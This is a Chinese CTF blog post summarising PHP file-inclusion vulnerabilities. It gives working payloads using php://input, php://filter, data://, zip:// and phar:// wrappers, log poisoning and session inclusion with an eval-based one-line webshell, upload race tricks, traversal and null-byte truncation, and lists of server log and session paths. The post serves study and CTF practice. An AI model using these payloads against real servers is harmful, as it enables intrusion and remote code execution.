---
layout: post
title: CTF-文件包含漏洞
subtitle: CTF-Web-php文件包含漏洞的小结
date: 2020-04-04
author: BlackDn
header-img: img/acg.ggy_17.jpg
catalog: true
tags:
  - Security
---

> "坠欢莫拾，酒痕在衣。苍山负雪，笔墨不离。"

# 前言

清明，默哀。  
肝博客确实累，资料也看了很多，也算是小结了一类 Web 题目。  
这估计是我为数不多的连更（多亏了全天停服）  
再接再 🌰

# 文件包含漏洞

代码传入文件，从而直接执行文件中的代码  
通常文件包含漏洞产生于**文件包含函数**的使用

1. **LFI（Local File Inclusion）**：本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是 LFI
2. **RFI（Remote File Inclusion）**：远程文件包含漏洞，要求`allow_url_fopen=On`(默认为 On) ，规定是否允许从远程服务器或者网站检索数据；`allow_url_include=On`(php5.2 之后默认为 Off) ，规定是否允许`include/require`远程文件

## php 常见文件包含函数

1. `include()`：遇到错误生成警告，继续执行脚本
2. `require()`：遇到错误生成致命错误，脚本继续
3. `include_once()`：如果文件已包含，则不再进行包含，一定程度避免错误
4. `require()_once()`：如果文件已包含，则不再进行包含，一定程度避免错误
5. `fopen()`，`file_get_contents()`等：文件读取函数

```
<?php
$file = $_GET['file'];
include($file);
...
```

## 文件包含漏洞的利用

### 一、php 伪协议

利用伪协议上传或读取文件是文件包含漏洞里比较基础和常用的方式  
PHP 提供了一些输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出等

#### 1. php://input

`php://input` 是个可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行  
需要`allow_url_include=On`  
**遇到 file_get_contents()要想到用 php://input 绕过**

假设代码审计中遇到`file_get_contents()`函数，由于该函数的对象是数据流，需要读取文件，我们将`file_get_contents()`的对象赋值为`“php://input”`，从而将对象转为读取的数据，此时可以用 post 将`file_get_contents()`的对象赋值成需要的值，或执行需要的的 php 代码

举个 🌰，下面是一道简单的题目：

```
1. 构造 ?file=php://input
2. post data中输入：<?php system('dir');?>    //代码表示显示所有文件目录
3. 根据显示的文件目录直接进行访问（某txt或php文件），得到flag
```

#### 2. php://filter

`php://filter/`是一种访问本地文件的协议  
当它与包含函数（如`include()`）结合时，`php://filter`流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行，从而实现任意文件读取。

```
构造方法：
?file=php://filter/read=convert.base64-encode/resource=index.php
```

1. `/read=convert.base64-encode/`表示对读取数据进行 base64 编码
2. `resource=index.php`表示目标文件为 index.php

执行后可得到 index.php 的 base64 加密的源码

#### 3. data://

类似`php://input`，可以让用户来控制输入流，用户输入的`data://`流会被当作 php 文件执行，从而执行我们想要执行的代码  
要求`allow_url_fopen=On`，`allow_url_include=On`

```
构造方法：
1. ?file=data://text/plain,<?php phpinfo()?>    //执行phpinfo()
2. ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=    //将命令进行base64加密，编码为“<?php phpinfo()?> ”的base64编码
3. ?file=data:text/plain,<?php phpinfo()?>    //去掉双斜杠
4. ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

#### 4. zip://

`zip://` 可以访问压缩包里面的文件。  
`zip://`中只能传入**绝对路径**；要用`#`分隔压缩包和压缩包里的内容，且`#`要用 url 编码`%23`代替

```
构造方法：
?file=zip://D:\file.zip%23flag.txt
```

1. `D:\file.zip`表示压缩包的绝对路径
2. 后跟`%23`分割压缩包和压缩包中要访问的文件名

#### 5. phar://

类似`zip://`，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压

```
构造方法：
1. ?file=phar://D:\file.zip\flag.txt    //绝对路径
2. ?file=phar://file.zip\flag.txt    //相对路径
```

### 二、包含日志文件

当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含 PHP 一句话木马时，也会被记录到日志中。我们把 PHP 代码插入到日志文件中，再通过包含这个日志文件来执行其中的 PHP 代码  
要求：日志文件可读，知道日志文件存储目录  
一般日志存储目录会被修改，需要读取服务器配置文件（`.conf`）或者查看`phpinfo()`信息。通常需要 curl 命令行 url 访问工具或者 bp 修改浏览器转码字符来**避免转码而导致代码无法执行**

Apache 运行后一般默认会生成两个日志文件，Windows 下是`access.log`（访问日志）和`error.log`(错误日志)，Linux 下是`access_log`和`error_log`，访问日志文件记录了客户端的每次请求和服务器响应的相关信息

参考：  
[包含日志文件 getshell](https://www.cnblogs.com/my1e3/p/5854897.html)

#### 例题

来源：[SHACTF-2017-Web-writeup](https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two)

1. 题目提示 apache 的 log，访问`http://.../?page=//etc/apache2/sites-enabled/000-default.conf`，得知`error.log`在默认位置，而 CustomLog 由`var/www/html/log.sh`决定
2. 访问`http://.../?page=//var/www/html/log.sh`，得知 CustomLog 保存到`/var/www/html/logs/{HOST}.log`中，而{HOST}即为自己的 ip 地址
3. 构建访问`payload：http://.../<?php @eval($_POST['test']);?>`，用 bp 截包修改被转义的字符并发送
4. 访问对应 ip 地址的 log 文件：`http://.../?page=//var/www/html/logs/yourvpsip.log`
5. 菜刀连上，密码为 test，得到 flag

### 三、包含 SESSION

PHP 手册中的描述：

1. PHP 会将会话中的数据设置到 `$_SESSION` 变量中
2. 当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存
3. 对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。

要包含并利用的话，需要能控制部分 sesssion 文件的内容。暂时没有通用的办法。有些时候，可以先包含进 session 文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入 payload，并之后再次包含从而执行 php 代码

php 的 session 文件的保存路径可以在 phpinfo 的`session.save_path`看到，  
session 文件格式： `sess_[phpsessid]` ，phpsessid 在发送的请求的 cookie 字段中可以看到

#### 例题

来源：[PHP 文件包含 Session](https://chybeta.github.io/2017/11/09/一道CTF题%EF%BC%9APHP文件包含/)

内容比较多就不细写了，大题步骤是：

1. 利用`php://filter`读取各文件源码
2. 尝试几个常用路径得到 session 文件路径，详见**附录 2**
3. 找到 session 中的可控变量 username，但是被 base64 加密。根据 session 前缀和 base64 编码过程使前缀解码为乱码，username 不受影响
4. 注册帐号，使 username 其 base64 加密后的长度大于 100
5. 成功 getshell，再利用任意代码执行漏洞查看目录下的文件并打开找到 flag

### 四、包含上传文件

利用上传功能，采取上传一句话图片木马的方式进行包含  
通常写入一句话木马后改文件后缀为图片文件，再细一点可以将改文件压缩为 zip 压缩包，之后使用伪代码`zip://`包含到压缩包中的图片木马

#### 例题

来源：[https://chybeta.github.io/2017/08/22/XMAN 夏令营-2017-babyweb-writeup/](XMAN夏令营-2017-babyweb-writeup)  
类似利用临时文件的存在，在短时间内去实现包含上传

1. 一个图片上传功能，一个图片查看功能，利用`php://filter`读取各文件源码
2. 在`upload.php`中，它先将上传的文件保存到 uploads 文件夹下，然后`sleep(2)`，接着一系列操作后，正常情况下其中的 php 代码会被去掉，图片已经不是图片木马了。不过由于存在`sleep(2)`，可以利用这个两秒的空隙，利用**phar**或者**zip 协议**去包含我们上传的还未被删除的图片木马
3. 编写一句话木马**k.php**，代码为`<?php @eval($_POST['test']) ?>`。将它压缩为 zip 文件，文件名为`k.zip`。上传时将其文件名改为`k.jpg`，类型改为`image/jpeg`
4. 只有 2 秒的操作时间所以需要脚本来辅助执行（脚本据具体内容参见来源）
5. 跑脚本来 getshell

## 文件包含漏洞的绕过

#### 1. 目录遍历

使用 `../../` 来返回上一目录

```
?file=../../phpinfo/phpinfo.php
```

#### 2. %00 截断

在文件名的最后加上`%00`来截断指定的后缀名，用到的比较少  
例如题目需要访问某 php 文件，但是代码已经指定了某种文件类型，如 `include("include/".$_GET['file']."txt")` ，这个时候就需要我们截断后面的 txt

```
 ?file=shell.php%00
```

需要`magic_quotes_gpc = Off`，`php version < 5.3.4`

## 附录 1：日志和配置文件默认存放路径

| 文件                        | 路径                                                                        |
| --------------------------- | --------------------------------------------------------------------------- |
| apache+Linux 日志默认路径   | /etc/httpd/logs/access_log 或/var/log/httpd/access_log                      |
| apache+win2003 日志默认路径 | D:\\xampp\\apache\\logs\\access.log 以及 D:\\xampp\\apache\\logs\\error.log |
| IIS6.0+win2003 默认日志文件 | C:\\WINDOWS\\system32\\Logfiles                                             |
| IIS7.0+win2003 默认日志文件 | %SystemDrive%\\inetpub\\logs\\LogFiles                                      |
| nginx 日志文件              | 用户安装目录 logs 目录下（/usr/local/nginx/logs）                           |
| -                           | -                                                                           |
| apache+linux 默认配置文件   | /etc/httpd/conf/httpd.conf 或 index.php?page=/etc/init.d/httpd              |
| IIS6.0+win2003 配置文件     | C:/Windows/system32/inetsrv/metabase.xml                                    |
| IIS7.0+WIN 配置文件         | C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config              |

## 附录 2：session 常见存储路径

1. `/var/lib/php/sess_PHPSESSID`
2. `/var/lib/php/sess_PHPSESSID`
3. `/tmp/sess_PHPSESSID`
4. `/tmp/sessions/sess_PHPSESSID`

## 参考

1. [php 文件包含漏洞](https://chybeta.github.io/2017/10/08/php文件包含漏洞/)
2. [CTF 中文件包含漏洞总结](https://blog.csdn.net/qq_42181428/article/details/87090539)
